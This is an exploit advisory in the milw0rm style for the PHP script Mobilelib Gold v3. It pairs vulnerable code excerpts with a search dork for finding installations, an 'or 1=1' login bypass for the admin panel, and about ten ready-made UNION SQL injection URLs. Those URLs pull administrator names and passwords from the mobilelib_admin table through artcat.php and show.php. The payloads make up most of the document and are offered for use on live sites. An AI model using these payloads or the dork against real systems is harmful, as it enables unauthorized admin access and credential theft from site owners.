@@ -1,0 +1,85 @@
+------------------Mobilelib Gold v3 (Auth Bypass/SQL) Multiple Remote Vulnerabilities----------------------------
+                       #                                                                            
+   #    ####     #    ###      ##   ###  ####  ####  ###   #####   ####  ####   ###     #    ### ####  ######
+   ##    #  #    ##    # #    # #  #  #   # #   #  #  #    #  #   #    #  # #  #  #     ##    #   # # #  #  #
+   # #   #  #    # #   # #    # #  #      #     #  #   #   #  #  #        #    #        # #   #   #      #   
+  #  #   ###    #  #   ###   #  #   ##    ###   ###    #  #   #  #        ###   ##      #  #  #   ###    #   
+  ####   #  #   ####   #  # ######    #   #     #  #    # #   #  #        #       #     #   # #   #      #   
+ #   #   #   # #   #   #  #     # #   #   #     #   #   ##    #   #    #  #   #   #     #    ##   #      #   
+##    #####   ##    ######     ### ###   ####  ###   #   #   ###   ####  ####  ###   # ###    #  ####   ###  
+
+
+#----------------------------------------------------------------------------------------------------------------
+Script : Mobilelib Gold
+version : 3.0
+Language: PHP
+Site: http://www.ac4p.com
+Dork: intext:Powered by Mobilelib Gold v3
+Found by: SwEET-DeViL
+
+need magic_quotes_gpc = Off
+
+#----------------------------------------------------------------------------------------------------------------
+
+)=> cp/auth.php  || Auth Bypass SQL Injection  Vulnerability
+.................................................................................................................
+   $adminName=$_POST['adminName'];
+   $adminName=strip_tags($adminName);
+   $Xadminpass=strip_tags($Xadminpass);
+   $adminlogin=@mysql_query("SELECT * FROM mobilelib_admin WHERE adminn='$adminName' AND adminpass='$Xadminpass'");
+.................................................................................................................
+#Exploit:
+
+username : 'or 1=1/*
+
+
+
+)=> artcat.php  || Remote SQL Injection  Vulnerability
+.................................................................................................................
+if($_GET['cid'])
+{
+$cid = intval( $_GET['cid'] );
+$cid = preg_replace("/'\/<>\"/","",$_GET['cid']); //X
+.................................................................................................................
+
+
+#Exploit:
+
+http://WWW.Site.Com/goldv3/artcat.php?cid=-1'+union+select+adminpass,2,adminn,4,5+from+mobilelib_admin/*
+-----------------------------------------------------------------------------------------------------------------
+
+
+
+.................................................................................................................
+
+)=> show.php || Remote SQL Injection  Vulnerability
+#Exploit:
+
+http://WWW.Site.Com/goldv3/show.php?cat=games&catid=-1'+union+select+1,2,adminpass,4,5,adminn,7,8+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=pro&catid=-1'+union+select+1,2,adminn,adminpass,5,6,7,8,9+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=themes&catid=-1'+union+select+1,2,3,4,adminn,adminpass,7+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=wallpapers&catid=-1'+union+select+1,2,3,4,adminn,adminpass,7+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=blue&catid=-1'+union+select+1,2,adminpass,4,5,6,7,8+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=mms&catid=-1'+union+select+1,2,adminpass,4,5,6,7,8+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=sound&catid=-1'+union+select+1,2,adminpass,4,5,6,7,8,9+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=vido&catid=-1'+union+select+1,2,adminpass,4,5,6,7,8,9,10+from+mobilelib_admin/*
+
+http://WWW.Site.Com/goldv3/show.php?cat=msgs&catid=-1'+union+select+1,2,adminpass,4,5,6,7,8+from+mobilelib_admin/*
+-----------------------------------------------------------------------------------------------------------------
+
+
+/-------------www.arab4services.net-----------------\
+|+------------------------------------------------+ |
+||          SwEET-DeViL & viP HaCkEr              | |
+||            gamr-14(at)hotmail.com              | |
+|+------------------------------------------------+ |
+\---------------------------------------------------/
+
+# milw0rm.com [2009-08-01]
